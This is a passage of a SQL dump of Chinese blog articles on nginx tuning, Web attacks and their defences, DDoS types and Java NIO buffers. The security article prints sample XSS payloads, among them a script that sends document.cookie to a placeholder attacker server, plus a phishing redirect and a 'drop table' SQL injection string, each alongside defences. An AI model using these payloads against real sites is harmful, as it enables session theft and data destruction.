expires注意点\nnginx的缓存设置可以提高网站性能.对于网站的图片,尤其是新闻站,图片一旦发布,改动的可能性非常小,我们希望在用户访问一次后,图片缓存在用户的浏览器端,且时间较长的缓存可以用到nginx的expires设置,nginx中设置过期时间,一般在location里设置\n// expries优点\n(1) expires可以降低带宽,节约成本\n(2) 同时提升用户访问体验\n(3) 减轻服务器的压力,节约服务器成本,是web服务非常重要的功能\n\n// expires缺点\n(1) 被缓存的页面或数据更新了,用户看到的可能还是旧的内容,反而影响用户体验\n(2) 网站流量统计不准确\n(3) 更新频繁的文件\n\n// expires设置\n// 格式: expires 30s; # 30秒;expires 30m; # 30分钟;expires 2h; # 2个小时;expires 30d; # 30天\n// 客户端对静态内容缓存\nlocation ~*\\.(gif|jpg|jpeg|png|bmp|swf)$ {\n	expires 30d; # 30天\n	root html;\n}\n```\n### 反向代理长连接\n```java\nupstream server_pool {\n	server localhost:8080 weight=1 max_fails=2 fail_timeout=30s;\n	server localhost:8081 weight=1 max_fails=2 fail_timeout=30s;\n	keepalive 300; #300个长连接\n}\nlocation / {\n	proxy_http_version 1.1;\n	proxy_set_header Upgrade $http_upgrade;\n	proxy_set_header Connection \"upgrade\";\n	proxy_pass http://server_pool/;\n}\n```\n### 内核参数优化\n```java\n// 修改/etc/sysctl.conf相关参数\nfs.file-max = 999999\nnet.ipv4.tcp_max_tw_buckets = 6000\nnet.ipv4.ip_local_port_range = 1024 65000\nnet.ipv4.tcp_tw_recycle = 1\nnet.ipv4.tcp_tw_reuse = 1\nnet.ipv4.tcp_keepalive_time = 30\nnet.ipv4.tcp_syncookies = 1\nnet.core.netdev_max_backlog = 262144\nnet.ipv4.tcp_max_syn_backlog = 262144\nnet.core.rmem_default = 6291456\n// 更改后执行sysctl -p生效\n```\n### nginx防盗链\n```java\n// 3种解决方法\n(1) 水印,品牌宣传;你的带宽,服务器足够\n(2) 防火墙,直接控制,前提是知道IP来源\n(3) 直接给予404的错误提示\n\n// 一般防盗链如下\nlocation ~*\\.(gif|jpg|png|swf|flv)$ {\nvalid_referers none blocked www.xxx.com\nif ($invalid_referer) {\n	rewrite ^/ http://www.xxx.com/error.html;\n	# return 403; \n}}\n\n// 针对图片目录防盗链\nlocation /images/ {\n	alias /data/images/;\n	valid_referers none blocked server_names *.xok.la xok.la;\n	if ($valid_referers) {\n		return 403; \n	}\n}\n```\n### ngx_http_stub_status监控\n```java\n// 查看nginx线程信息\n// 官方文档: http://nginx.org/en/docs/http/ngx_http_stub_status_module.html\n// (1) 确保nginx编译时加入了stub_status模块\nsbin/nginx 输入nginx -V查看编译模块信息\n\n// nginx.conf配置内容\nlocation = /nginx_status {\n   stub_status on;\n   access_log off;\n   allow 127.0.0.1;\n   deny all;\n}\n\n重启nginx\nwget http://127.0.0.1:80/nginx_status\ncat nginx_status,具体参数信息查看官方文档\n```\n### ngxtop监控请求信息\n```java\n// 查看nginx请求成功与失败信息\n// 官网文档: https://github.com/lebinh/ngxtop\n// 安装\nyum install epel-release\nyum install python-pip\npip install ngxtop\nexport PATH=$PATH:/usr/local/nginx/sbin\n\n// ngxtop使用\n指定配置文件: ngxtop -c /usr/local/nginx/conf/nginx.conf\n查询状态是200: ngxtop -c /usr/local/nginx/conf/nginx.conf -i \'status==200\'\n查询访问最多ip: ngxtop -c /usr/local/nginx/conf/nginx.conf -g remote_addr\n```', 0, 0, 23, 0, 0, '2019-03-11 16:08:22', '2019-03-23 16:08:22', 0, 0);
INSERT INTO `article` VALUES (22, 1, '黑客常见攻击手段与如何防范', '2019/1/1547197522_40761311_p0_master1200.jpg', '### 概述\n```java\n// 为什么是Web安全\n1. 基于Web环境的互联网应用越来越广泛，企业信息化的过程中各种应用都架设在Web平台上，Web业务的迅速发展也引起黑客们的强烈关注\n2. 接踵而至的就是Web安全威胁的凸显，黑客利用网站操作系统的漏洞和Web服务程序的漏洞等得到Web服务器的控制权限，轻则篡改网页内容，重则窃取重要内部数据，更为严重的则是在网页中植入恶意代码，使得网站访问者受到侵害\n3. 由于黑客的职业化程度越来越高，针对Web应用的攻击手段和技术日趋高明、隐蔽，致使大多Web应用处在高风险环境下开展。\n\n// 常见的攻击手段\n1、XSS\n2、CSRF\n3、SQL注入\n4、上传病毒文件\n5、验证码暴力穷举\n6、窃取请求参数\n7、篡改请求参数\n\n```\n### XSS攻击\n![网络安全XSS攻击反射型.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624939334_网络安全-XSS攻击-反射型.png)\n![网络安全XSS攻击持久性攻击.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624939334_网络安全-XSS攻击-持久性攻击.png)\n```java\nXSS的全称是CrossSiteScript，跨站点脚本攻击\n意思是说，黑客恶意篡改你的网页的前端代码，在里面注入一些他的html+javascript的脚本和代码\n然后在你访问那个网站的网页的时候，他注入的那些恶意脚本就会运行\nXSS攻击常见使用JS脚本,因为浏览器默认支持脚本语言执行,如果在表单提交的时候,提交一些脚本参数,可在浏览器执行执行\n恶意脚本运行时就会控制你的浏览器，这个时候他的脚本就可以做很多很多的事情了\n\n// 反射型攻击\n第一种XSS攻击是反射型攻击，黑客想办法让你点击一个URL链接，在这个URL链接里嵌入他自己的恶意脚本\n当你点击那个URL链接之后，那个URL指向的是黑客自己的服务器上的一段恶意脚本返回\n他可能给你展示的是图片或者是flash的动图或者是一个小视频，引诱你去点击\n恶意脚本被返回到你的浏览器里就会运行，然后就可以控制你的浏览器里行为了，他可以干很多的事\n他一旦控制了你的浏览器就可以得到大量的东西，浏览器里包含了你的一些cookie，有的浏览器可能还存储了你的密码，通过知道你的cookie，就可以利用cookie伪造你的用户登录的session状态，去以你这个用户的名义去正规网站干一些事\n\n// 持久型攻击\n另外一种XSS攻击是做持久型攻击，比如是个什么论坛或者社交网站之类的系统，可以发布一些帖子或者评论内容\n此时黑客就可以在评论里面写一段恶意脚本,然后把恶意脚本混杂在评论内容里提交到网站的数据库里去\n然后其他用户在社交网站里浏览到了这个恶意脚本评论，评论内容会被返回到浏览器里去，这段评论内容是包含恶意js脚本的，这个评论一被看到恶意脚本就马上运行,就可以干坏事了\n\n// 防御XSS\n如果要防止XSS攻击，一般来说手段有如下两种：\n   (1) HttpOnly方式\n在浏览器里存放cookie的时候，可以设置一个HttpOnly属性\n比如说存放用户加密认证信息的cookie设置为HttpOnly,这样在浏览器里运行的js脚本是被禁止访问这些HttpOnly cookie的\n黑客就无法窃取在浏览器里存储的cookie了\n   (2) 消毒机制\n黑客在评论内容里混入恶意脚本，那么你的代码里必须对内容进行消毒\n消毒就是进行一些转义，比如说把>转义为&gt之类的，这样就可以把恶意脚本里的html标签、js代码之类的东西，都给转义掉，让这些恶意脚本失效\n这样的话，转义以后的脚本被其他用户看到的时候也不会在浏览器里运行\n<html><script>...</script></html>\n// 消毒转义一下\n&lthtml&gt&lt; script &gt ... &lt; script &gt&lthtml&gt\n	\n// XSS攻击漏洞常见用途\n1、注入让客户端崩溃的代码,比如无限循环\n2、盗取cookie收集起来,冒充用户伪造请求等操作\n3、注入比特币挖矿代码,榨干计算机性能\n4、发送钓鱼网站链接,提交参数带上XSS脚本攻击,比如进入假的支付平台\n// 评论中注入JS脚本,比如让客户端陷入循环崩溃\n<script>while(1) {console.log(\'哈哈哈哈\');}</script>\n// 注入挖矿代码,榨干计算机性能\n<script> 挖矿代码 </script>\n// 盗取cookie收集起来,冒充用户伪造请求等操作\n<script>\n	var allcookies = document.cookie\n	window.open(\'http://黑客服务器:8080/cookie.asp?msg=\' + allcookies)\n</script>\n// 发送钓鱼网站链接,提交参数带上XSS脚本攻击,进入假的支付平台\npay.zhifubao.com?userId=1&s=<script>window.location.href=\'http://diaoyuwangzhan.com\'</script>\n\n```\n### CSRF\n![网站安全CSRF.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624943995_网站安全-CSRF.png)\n```java\nCross Site Request Forgery，垮站点请求伪造\n黑客伪造成用户去发送请求到系统，然后查询用户的数据，转账交易之类的重要数据\n黑客伪装成用户的前提是已经拿到了用户的认证令牌,比如通过之前的XSS方法从cookie中拿到认证令牌\n利用用户的cookie伪装成用户登录的状态，然后再去用postman发送垮站点伪造请求\n\n// 防御CSRF\n防御CSRF的方法主要是以下几种\n(1) 防止cookie被窃取\n	最根本的是说防止cookie被窃取,网站的重要cookie设置HttpOnly属性,禁止被script脚本窃取，那么黑客就无法得到认证令牌进而就无法伪造用户登录请求了\n(2) Referer请求头\n	http请求里有一个referer请求头，里面带有这个请求的来源，服务器可以验证一下这个请求是不是从自己的页面来的，如果是的话才执行，否则就不执行\n(3) 随机token\n	服务器每次返回一个页面数据时，都生成一个随机token,同时在redis里存储,页面得到随机token后附加在页面的隐藏元素中\n	然后页面发送请求的时候附加随机token，服务器比对随机token验证通过才能执行请求\n	黑客直接用postman构造请求就不知道随机token是什么了\n(4) 验证码\n	页面提交时必须要验证码，带图形的那种\n	现在比较流行的是拖动一个拼图,必须验证码通过了才能执行你的请求\n	避免黑客直接postman伪造请求发送过来\n(5) 短信验证码\n	这个是比较常见的，最好是在用户进行支付交易的时候，要求必须使用短线验证码,验证是用户本人在操作\n\n```\n### SQL注入\n![网络安全SQL注入.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624942568_网络安全-SQL注入.png)\n```java\nSQL注入指的是黑客提交不正常的SQL关键字数据,如果服务端不注意,那么就会产生SQL注入问题\n\n// 黑客如何通过SQL注入来攻击我们的系统\n在数据库里执行SQL语句的时候,如果程序代码中,sql语句如果直接拼接方式执行入库,会造成SQL注入问题\n导致黑客把一些恶意的SQL语句注入进系统再进入数据库执行\n比如\n/goods?goodsSkuNo=123\n// 正常情况\n/goods?goodsSkuNo=123\nSELECT * FROM goods_sku WHERE goods_sku_no=‘123’\n// 黑客注入\n/goods?goodsSkuNo=123;drop table eshop_goods_sku;\nSELECT * FROM goods_sku WHERE goods_sku_no=‘123’;drop table goods_sku ;‘\n这样就直接把表给删了,或者把数据库的数据给改了,污染数据库的数据\n\n但是做SQL注入，其实不是那么容易的，因为黑客必须要知道数据库表结构才行，一般获取数据库表结构的方式有下面几种\n(1)开源软件，比如开源的博客系统，论坛系统，或者别的什么系统，黑客自然知道你的表结构了，这种情况是比较少见的\n(2)错误回显，服务器程序报错，结果直接在浏览器页面上显示出异常堆栈信息，包括有错误的SQL语句,通过这个黑客就知道了你的表结构长什么样\n(3)根据接口名,请求参数名,大致推测数据库表结构，这个一般不太现实\n\n// 防范SQL注入\n1、第一个是别让黑客知道你的数据表结构,关闭服务器的错误回显,不要把堆栈信息返回\n2、第二个是持久层的SQL语句使用预编译方式,不要直接拼接完再执行,预编译会将敏感内容当作普通的字符串进行处理,而不是当成SQL关键字\n\n// Java的JDBC预编译\nconnection = DriverManager.getConnection(url, username, password);\nps = connection.prepareStatement(\'SELECT id, telephone FROM users WHERE nickname = ?\');\nps.setObject(param.getNickname()); // 填充并预编译\nps.executeQuery(); // 执行\n\n// mybatis	\ninsert into xxx_table(xxx,xx,xx) values(#{xx},#{xx},#{xxx})\nmybatis会对这个方法比如传递进去了一个map或者是对象，，根据占位符的变量名，从Map里或者是对象里提取出来一个一个的参数的值，进行预编译SQL的参数值的设置\n预编译，就是说把黑客在参数里混进来的SQL语句当做一个参数，而绝对不会作为独立的SQL语句去执行，这就避免了SQL注入攻击\n\n所以平时开发时，一定要注意这两件事情，关闭服务器错误回显，使用包括mybatis之类的预编译，千万不要直接拼接SQL语句\n\n```\n### 上传病毒文件\n![网络安全上传病毒文件.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624947341_网络安全-上传病毒文件.png)\n```java\n如果网站允许用户上传文件，那么文件可能会是可执行的脚本，也可能是病毒或者木马文件,其实这个是非常危险的\n如果文件是脚本的话，可能会在服务器执行,从而造成很多破坏\n比如黑客黑掉你的服务器，勒索比特币,格式化整个系统的数据\n\n黑客把自己的木马文件后缀改成.jpg、.txt来上传,但其实本质是个病毒文件\n病毒脚本是非常可怕的，黑客只要掌握底层的技术，就可以利用病毒脚本干各种各样的事情，比如连接你的数据库之类的\n\n// 防御上传病毒文件\n1、限制上传文件的类型，只能是指定的文件类型\n2、限制文件的大小，对文件重命名，\n3、限制文件类型不能简单的根据后缀来判断，可能后缀被篡改了，但其实是个病毒文件,所以要根据文件二进制数据的开头几个字节代表的magic number来判断文件的类型\n	比如\n	FFD8FF：JEPG\n	89504E47：PNG\n4. 对文件进行压缩，破坏原来的文件结构，避免文件在服务器执行，利用imagemagick这类开源包，可以很方便进行文件压缩\n\n```\n### 验证码暴力穷举破解\n![网络安全验证码暴力穷举破解.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624945855_网络安全-验证码暴力穷举破解.png)\n```java\n一般支付,找回密码等重要业务会使用6位数的短信验证码,这是为了保证是用户本人在操作\n但是输入验证码错误后可以继续尝试输入,一般错误5次以上的时候就会冻结账号并向该手机号码的号主发被盗号短信\n但是一些小软件的服务端并没有记录错误次数,是可以无限次重试的,一个6位数的验证码开多线程穷举一下子就破解了\n\n// 防御暴力穷举\n错误计数机制,服务端记录验证码错误次数,当验证码错误达到一定程度立刻冻结账号,并发送短信给用户被盗号信息\n\n```\n### 窃取请求参数\n![网络安全请求参数未使用非对称加密.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624948784_网络安全-请求参数未使用非对称加密.png)\n```java\n对称加密不是安全的,因为客户端与服务端使用的是同一把密钥,都可以把数据加解密\n如果黑客反编译破解客户端APK拿到了这把对称密钥,那么黑客就可以借助这把密钥随意发送请求给服务端了\n许多的小型移动APP不会采用加密,都是明文,就更别提了\n\n// 防御明文数据\n使用非对称加密\n使用公钥加密,必须用私钥解密\n使用私钥加密,必须用公钥解密\n目前来说这是最安全的加密手段\n核心支付、转账接口和金融接口必须保证传输过程中的数据被加密,是密文的\n\n```\n### 篡改请求参数\n![网络安全请求参数篡改.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624948093_网络安全-请求参数篡改.png)\n```java\n客户端向服务端发送请求一般使用http请求,但是黑客可以使用fiddler等抓包工具得到请求参数数据\n如果这些请求参数是没加密的明文,那么所有的请求参数黑客都知道的一清二楚了\n黑客把这些请求参数的部分改掉,让实际请求参数和用户操作传递的请求参数不一致\n\n这是非常严重的漏洞,比如股票下买单时,用户原本是只想买100股股票,但是黑客抓包把100股改成了500股,和用户买的股数完全不一样\n\n// 防御篡改数据\n(1) 请求参数进行非对称加密\n	被抓包的数据是加密的密文,这样黑客根本不知道这些密文代表着什么进而无从下手\n(2) 请求参数加上参数签名 \n	将所有请求参数进行加密得出一个hash值连带着其他请求参数一起传递给服务端\n	服务端得到请求参数后,像页面一样加密得出一个hash值,对比这个hash值是否与页面传递过来的hash值是否一致\n	如果hash值一致说明没有被篡改,如果不一致说明传递中数据被篡改了\n\n```', 0, 0, 213, 0, 0, '2019-05-11 16:59:21', '2019-06-15 16:59:21', 0, 0);
INSERT INTO `article` VALUES (23, 1, 'DDos攻击方式', '2019/1/1547211260_49656023_p0_master1200.jpg', '### Dos攻击\n![网络安全Dos.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624950922_网络安全-Dos.png)\n```java\nDoS攻击\n黑客知道你的服务器地址\n你的系统假设每秒最多抗下1000请求\n黑客也拿一台机器以每秒1000请求访问你\n现在你的服务器线程资源全部打满\n正常用户无法发送请求接收回应,你的网站系统资源全被黑客吃掉了\n黑客甚至以每秒1万请求攻击你的服务器,那么你的服务器直接就宕机了\n\nDoS攻击是一对一的\n黑客搞一台高性能服务器，拼命发送请求给你的一台服务器\n但如果你的服务器配置超高,每秒能抗1万请求\n结果黑客的机器每秒才5000请求，那么就没用了,黑客不能完全吃掉\n\n```\n### DDos攻击\n![网络安全DDos.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624950922_网络安全-DDos.png)\n```java\nDDoS，distributed denial of service，分布式拒绝服务攻击,Dos的升级版\nDOos是最可怕的黑客攻击,可以把你的网站、APP、系统给搞瘫痪\n\n黑客控制大量的机器，比如普通人的电脑或者是一些公司的服务器\n全被他的一些木马植入给控制了，这些机器变成了所谓的“肉鸡”\n黑客下达指令,让所有肉鸡一起发送请求给攻击目标，直接搞瘫目标的服务器\n\n// 如何防御DDoS攻击\n这是非常专业的一种攻击手段,我们自己基本上是做不到防御的\n我们可以采购云厂商的安全服务，比如DDoS高防IP，可以把攻击流量都导入到云厂商的高防IP的服务器上去，他们有专业的技术方案和算法来防御\n\n```\n### DDos攻击方式\n#### TCP SYN Flood\n![网络安全DDosTCPSYNFLOOD.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624952980_网络安全-DDos-TCPSYNFLOOD.png)\n```java\nTCP三次握手的第二次服务器有一个重试机制\n1、客户端发送一个SYN请求，指明客户端的端口号以及TCP连接的初始序列号\n2、的服务器收到SYN后，返回一个SYN+ACK，表示请求被接收，TCP序列号加1\n3、客户端收到服务器的SYN+ACK后，返回一个ACK给服务器，TCP序列号加1，连接建立完毕，接着可以通信了\n但如果服务器没有收到第三步的ACK，会重试返回SYN+ACK给客户端，同时处于SYN_RECV状态，把客户端放入等待列表。\n重试会3~5次，每隔30重试一次，遍历等待列表，再次重试发送SYN+ACK\n\n服务器只要返回SYN+ACK给客户端，就会为客户端预留一部分资源在服务器，重试期间都保留，等待跟客户端建立连接\n如果说太多的客户端来建立连接，资源耗尽，那么就无法建立新的TCP连接了\n利用这个机制黑客就会伪造大量的不同ip地址去发送SYN请求给一台服务器建立TCP连接，每次都是卡在服务器返回SYN+ACK\n但是黑客是不会最终返回ACK的，所以导致服务器可能为了黑客建立了大量的半连接放在等待列表里，占用了大量的资源，而且服务器还得不停的去重试\n一旦服务器的资源耗尽，那么正常的请求过来，是无法建立TCP连接的\nHTTP底层就是基于TCP实现的，一旦你无法建立TCP连接，那么这台服务器也自然接受不了任何HTTP请求\n\n```\n#### DNS Query Flood\n![网络安全DDosDNSQueryFlood.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624952980_网络安全-DDos-DNSQueryFlood.png)\n```java\nDNS Query Flood攻击，顾名思义，就是去攻击DNS服务器\n黑客伪造大量的域名解析请求发送给DNS服务器，DNS服务器必然没有这些域名\n那么DNS服务器必然会去找上级DNS服务器,一直到根域名服务器\n这样必然导致DNS服务器的资源耗尽，其他正常人浏览网页也要解析域名，但因为DNS攻击,就导致此时就没法访问DNS服务器了\n\n```\n#### HTTP Flood\n![网络安全DDosCCHTTPFLOOD.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624952980_网络安全-DDos-CCHTTPFLOOD.png)\n```java\ncc攻击也就是HTTP flood，代理服务攻击\n黑客直接在互联网上找到大量的HTTP代理,控制那些HTTP代理服务器去给目标服务器发送大量的HTTP请求\n目标网站服务器上都是会部署Web服务器，都是一个进程，启动多个线程，来并发的处理各种HTTP请求,比如Nginx、Tomcat、Jetty\n大量HTTP请求涌入服务器,资源瞬间被耗尽,没有更多的线程能进行处理,可能网站服务器直接就挂了\n\n```', 0, 0, 95, 0, 0, '2019-05-11 20:54:26', '2019-05-11 20:54:26', 0, 0);
INSERT INTO `article` VALUES (24, 1, '磁盘文件NIO概述', '2019/9/1567576574_D8D9E613575A503ABDDBAC8098B62205.jpg', '### IO\n![磁盘IO普通IO.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626667816_磁盘IO-普通IO.png)\n```java\njava.io中最为核心的一个概念是流(Stream),面向流的编程,Java中,一个流要么是输入流,要么是输出流,不可能同时既是输入流又是输出流\n在io编程当中,stream本身它是一个流,数据从流当中读到我们程序当中的\n我们读取的方式很简单,就是读取,读到一个字节就拿到一个字节,不断读取.这样数据就直接从stream当中读取到我们程序里面了\n```\n#### 代码例子\n```java\npublic class IOWriteTest {\n    public static void main(String[] args) throws Exception {\n        FileOutputStream fileOutputStream = new FileOutputStream(\"IOTest.txt\");\n        fileOutputStream.write(\"hello world\".getBytes());\n        fileOutputStream.close();\n    }\n}\n\npublic class IOTest {\n    public static void main(String[] args) throws Exception {\n        FileInputStream fileInputStream = new FileInputStream(\"IOTest.txt\");\n        int read = 0;\n        while(( read = fileInputStream.read())!=-1) {\n            char c = (char) read;\n            System.out.println(\"Character: \" +(char)c);\n        }\n        fileInputStream.close();\n    }\n}\n\npublic class IOCopyTest {\n    public static void main(String[] args) throws Exception {\n        FileInputStream fileInputStream = new FileInputStream(\"IOCopyInput.txt\");\n        FileOutputStream fileOutputStream = new FileOutputStream(\"IOCopyOutput.txt\");\n\n        int read = 0;\n        while((read = fileInputStream.read())!=-1) {\n            fileOutputStream.write(read);\n        }\n        fileInputStream.close();\n        fileOutputStream.close();\n    }\n}\n\n这是常见的io读取与写入文件内容,但是由于是stream,读到字节就拿到一个字节不断读取,无法控制读写位置,写入亦然\nio当中,一个流不可能同时是输入流又是输出流\n```\n\n### NIO\n![磁盘IONIO.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626667816_磁盘IO-NIO.png)\n```java\njava.nio中拥有3个核心概念: Selector,Channel与Buffer,在java.nio中,我们是面向块(block)或是缓冲区(buffer)编程的,buffer本身就是一块内存,底层实现上,它实际上是个数组,数据的读,写都是通过buffer来实现的\n在nio编程当中,是绝对不会出现io编程情况,在nio中,buffer是个极为重要的概念,读的数据来自于channel,这是一定要执行的一个步骤,\n就是将数据从channel读取到buffer当中,数据再从buffer读取到程序当中,绝对不可能出现的情况就是数据从channel直接读取到程序当中\nnio当中,一个channel把数据读到buffer当中,程序可以读取buffer中的数据,也可以把数据写回到buffer中这个读写状态就是通过方法来实现的,这个方法就是buffer.flip(),状态翻转\n除了数组之外,buffer还提供了对于数据的结构化访问方式,并且可以追踪到系统的读写过程\n读写过程指的是,读和写其实在底层都是通过相应的一些标识来判断当时读写位置,无论进行读写,系统都能自动定位你当前读写的位置在哪,以及翻转之后从哪读从哪写,可以读写到哪个地方\n```\n\n#### 代码例子\n```java\npublic class NIOWriteTest {\n    public static void main(String[] args) throws Exception {\n        FileOutputStream fileOutputStream = new FileOutputStream(\"NIOTest.txt\");\n        FileChannel fileChannel = fileOutputStream.getChannel();\n\n        ByteBuffer byteBuffer = ByteBuffer.allocate(512);\n        byte[] messages = \"hello world\".getBytes();\n        for (int i = 0; i < messages.length; i++) {\n            byteBuffer.put(messages[i]);\n        }\n\n        byteBuffer.flip(); // 状态翻转\n\n        fileChannel.write(byteBuffer);\n\n        fileOutputStream.close();\n    }\n}\n\npublic class NIOReadTest {\n    public static void main(String[] args) throws Exception {\n        FileInputStream fileInputStream = new FileInputStream(\"NIOTest.txt\");\n        FileChannel fileChannel = fileInputStream.getChannel();\n\n        ByteBuffer byteBuffer = ByteBuffer.allocate(512);\n        fileChannel.read(byteBuffer);\n\n        byteBuffer.flip();\n        // 有没有剩余的\n        while(byteBuffer.remaining() > 0) {\n            byte b = byteBuffer.get();\n            System.out.println(\"Character: \" +(char)b);\n        }\n        fileInputStream.close();\n    }\n}\n\npublic class NIOCopyTest {\n    public static void main(String[] args) throws Exception {\n        FileInputStream fileInputStream = new FileInputStream(\"NIOCopyInput.txt\");\n        FileOutputStream fileOutputStream = new FileOutputStream(\"NIOCopyOutput.txt\");\n        FileChannel inputChannel = fileInputStream.getChannel();\n        FileChannel outputChannel = fileOutputStream.getChannel();\n\n        ByteBuffer buffer = ByteBuffer.allocate(512);\n        while(true) {\n            buffer.clear(); // 如果注释掉这行代码,将会导致buffer的内容没有清空一直读取\n            int read = inputChannel.read(buffer);\n            System.out.println(\"read: \" + read);\n            if (-1 == read) {\n                break;\n            }\n            buffer.flip();\n            outputChannel.write(buffer);\n        }\n        inputChannel.close();\n        outputChannel.close();\n    }\n}\n\nchannel指的是可以向其写入数据或是从中读取数据的对象,它类似于Java.io中的stream\n所有数据的读写都是通过buffer来进行的,永远不会出现直接向channel写入数据的情况,或是直接从channel读取数据的情\n与stream不同的是,channel是双向的,而一个流只可能是inputStream或是outputStream,channel打开后则可以进行读取,写入或是读写\n由于channel是双向的,因此它能更好地反映出底层操作系统的真实情况,在linux系统中,底层操作系统的通道就是双向的\n```\n### Buffer的重要属性,以下内容为jdk源码解释\n```java\n// Buffer是什么\n用于特定基元类型的数据的容器\nbuffer缓冲区是特定元素的原始类型线性有限序列\n一个buffer除了它的内容之外,buffer重要本质的属性是 position,limit与capacity\n理解buffer的position,limit与capacity是非常非常重要的\n\n// position,limit与capacity\n一个buffer的capacity指的是它所包含的元素的个数,一个buffer的capacity永远不会是负数并且永远不会变化\n一个buffer的limit指的是不能被读也不能被写的第一个元素索引,一个buffer的limit是永远不会是负数的并且永远不会超过capacity\n一个buffer的position指的是下一个将要去读或者去写的元素索引,一个buffer的position是不可能是负数的并且永远不会超过limit\n\n// mark与reset\nmark: 标记保存当前position位置,它不会超过position,如果mark被定义,但当position和limit被调整到小于mark的话,mark会被丢弃掉变为-1\nreset: 将position回到mark所标记保存的位置,如果mark未定义然后调用会造成InvalidMarkException\n\n// Buffer的重要属性与方法\nclear：为一个新的序列准备一个缓冲区,它将会使position = 0;limit = capacity,mark = -1\nflip: 为一个新的序列准备一个缓冲区,它将会使limit = position,position = 0,mark = -1\nrewind: 倒带,它将会使position = 0,mark = -1\nIntBuffer.allocate(10): 分配缓冲区大小,也就是底层数组的大小\ncapacity: 初始化为空间大小,永远不会发生变化\nposition: 初始为0,指的是下一个将要去读或者去写的元素索引,当读或是写一个或多个元素,从当前position位置开始,然后会增加position位置,增加所读写传递的元素的数量\nlimit: IntBuffer的limit初始为空间大小,初始化limit可能是0,也可能是其他值,这个值依赖于buffer的类型以及相应的buffer构建方式\nbuffer.flip(): 状态翻转,它将会导致limit=position,position=0,mark=-1,在一系列通道读取或放置操作之后，调用此方法准备一系列通道写入或相对操作.此方法通常与java.nio.ByteBuffer＃compact compact方法从中传输数据一个地方到另一个地方\n\n// 相对操作与绝对操作\n此类的每个子类定义了两个类别进行操作：\n相对操作: 读取或写入一个或多个元素开始在当前位置，然后按位数递增位置元素转移,如果请求的转移超过限制,则get操作抛出BufferUnderflowException.相对的,put操作抛出BufferOverflowException.当抛出异常时,在任何一种情况下，都不会传输数据\n绝对操作: 采用显式元素索引而不是元素位置,当如果index参数超过限制,那么get和put操作将会抛出IndexOutOfBoundsException\n\n// 其他内容\n新创建的buffer,position值是0,mark是未定义的,初始化limit可能是0,也可能是其他值,这个值依赖于buffer的类型以及相应的buffer构建方式\n新创建buffer的每一个元素的每一个初始值为0 \n数据可以通过channel传输到buffer或从buffer中传出,它总是相对于当前position\n相对操作,读或是写一个或多个元素,从当前position位置开始,然后会增加position位置,增加所读写传递的元素的数量\n它们的不变关系为以下情况:0 <= mark <= position <= limit <= capacity\nJava中的8种原生数据类型其中7种都有各自对应的buffer类型,如IntBuffer,LongBuffer,ByteBuffer及CharBuffer等等,并没有BooleanBuffer类型\n```\n\n### 图示\n#### 创建buffer并添加数据\n![磁盘IO创建Buffer并添加数据.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626667816_磁盘IO-创建Buffer并添加数据.png)\n```java\n        IntBuffer buffer = IntBuffer.allocate(10);\n        System.out.println(\"start capacity:\" + buffer.capacity());\n        System.out.println(\"start position: \" + buffer.position());\n        System.out.println(\"start limit: \" + buffer.limit());\n        for (int i = 0; i < 5; ++i) {\n            int randomNumber = new SecureRandom().nextInt(20);\n            buffer.put(randomNumber);\n            System.out.println(\"put data position: \" + buffer.position());\n        }\n        System.out.println(\"before flip limit:\" + buffer.limit());\n        System.out.println(\"no data value: \" + buffer.get(9));\n```\n\n#### 调用buffer.flip()进行状态翻转\n![磁盘IOBuffer调用buffer.flip进行状态翻转.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626667816_磁盘IO-Buffer调用buffer.flip()进行状态翻转.png)\n```java\n        buffer.flip();\n        System.out.println(\"after flip limit:\" + buffer.limit());\n        System.out.println(\"after flip position: \" + buffer.position());\n        System.out.println(\"enter while loop\");\n        while (buffer.hasRemaining()) {\n            System.out.println(\"position: \" + buffer.position());\n            System.out.println(\"limit: \" + buffer.limit());\n            System.out.println(\"capacity: \" + buffer.capacity());\n\n            System.out.println(buffer.get());\n        }\n```\n### 其他对象\n#### SliceBuffer\n```java\npublic static void main(String[] args) {\n        ByteBuffer buffer = ByteBuffer.allocate(10);\n        for (int i = 0; i < buffer.capacity(); i++) {\n            buffer.put((byte)i);\n        }\n        // 起始位置指向2,limit指向6\n        buffer.position(2);\n        buffer.limit(6);\n        // 不包含6\n        ByteBuffer sliceBuffer = buffer.slice();\n        for (int i = 0; i < sliceBuffer.capacity(); i++) {\n            byte b = sliceBuffer.get(i);\n            b *= 2;\n            sliceBuffer.put(i, b);\n        }\n	    // 恢复初始状态   \n        buffer.position(0);\n        buffer.limit(buffer.capacity());\n        while (buffer.hasRemaining()) {\n            System.out.println(buffer.get());\n        } \n}\n\nSliceBuffer与原有buffer共享相同的底层数组\nbuffer.slice(): 创建一个新的byteBuffer,其内容是一个原Buffer共享的子序列\n这个新的buffer内容就会以原buffer的position作为起始位置,对这个buffer内容进行任何修改,对原buffer的任何修改都对新的buffer是可见的,反之亦然\n两个buffer的position,limit,mark都是独立的\n```\n#### ReadOnlyBuffer\n```java\npublic class NioTest7 {\n    public static void main(String[] args) {\n        ByteBuffer buffer = ByteBuffer.allocate(10);\n        System.out.println(buffer.getClass());\n        for (int i = 0; i < buffer.capacity(); i++) {\n            buffer.put((byte)i);\n        }\n        ByteBuffer readOnlyBuffer = buffer.asReadOnlyBuffer(); // 只读buffer\n        System.out.println(readOnlyBuffer.getClass());\n        readOnlyBuffer.position(0);\n        // readOnlyBuffer.put((byte)2);\n    